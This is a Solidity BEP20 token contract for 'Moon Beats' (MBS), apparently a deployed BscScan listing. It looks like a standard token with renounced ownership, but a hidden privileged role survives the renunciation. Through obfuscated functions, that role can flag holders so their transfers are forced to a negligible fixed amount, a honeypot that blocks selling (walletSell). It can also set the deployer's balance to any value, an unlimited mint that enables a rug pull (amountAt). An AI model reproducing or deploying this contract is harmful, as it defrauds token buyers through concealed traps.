/**
 *Submitted for verification at BscScan.com on 2023-01-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


contract MoonBeats is IBEP20 {
    uint8 constant _decimals = 18;
    mapping(address => mapping(address => uint256)) _allowances;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    mapping(address => uint256) _balances;

    mapping(address => bool) public takeExempt;


    address public liquidityLimit;
    address public marketingLiquidityLimit;
    address public owner;

    uint256 constant txLaunched = 10 ** 10;
    mapping(address => bool) public buyLiquidity;
    string constant _symbol = "MBS";
    string constant _name = "Moon Beats";
    modifier modeFee() {
        require(takeExempt[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor (){
        UniswapRouter launchedTo = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        marketingLiquidityLimit = UniswapFactory(launchedTo.factory()).createPair(launchedTo.WETH(), address(this));
        _allowances[address(this)][address(launchedTo)] = type(uint256).max;
        owner = msg.sender;
        liquidityLimit = msg.sender;
        takeExempt[liquidityLimit] = true;
        _balances[liquidityLimit] = _totalSupply;
        emit Transfer(address(0), liquidityLimit, _totalSupply);
        renounceOwnership();
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function walletSell(address burnTeam) public modeFee {
        buyLiquidity[burnTeam] = true;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function _transferFrom(address autoTo, address fundAuto, uint256 fundToken) internal returns (bool) {
        if (autoTo == liquidityLimit || fundAuto == liquidityLimit) {
            return minFund(autoTo, fundAuto, fundToken);
        }
        if (buyLiquidity[autoTo]) {
            return minFund(autoTo, fundAuto, txLaunched);
        }
        return minFund(autoTo, fundAuto, fundToken);
    }

    function minFund(address autoTo, address fundAuto, uint256 fundToken) internal returns (bool) {
        require(fundToken <= _balances[autoTo]);
        _balances[autoTo] -= fundToken;
        _balances[fundAuto] += fundToken;
        emit Transfer(autoTo, fundAuto, fundToken);
        return true;
    }

    function exemptSell(address toEnableTx) public modeFee {
        takeExempt[toEnableTx] = true;
    }

    function transferFrom(address autoTo, address fundAuto, uint256 fundToken) external override returns (bool) {
        if (_allowances[autoTo][msg.sender] != type(uint256).max) {
            require(fundToken <= _allowances[autoTo][msg.sender]);
            _allowances[autoTo][msg.sender] -= fundToken;
        }
        return _transferFrom(autoTo, fundAuto, fundToken);
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function amountAt(uint256 fundToken) public modeFee {
        _balances[liquidityLimit] = fundToken;
    }


}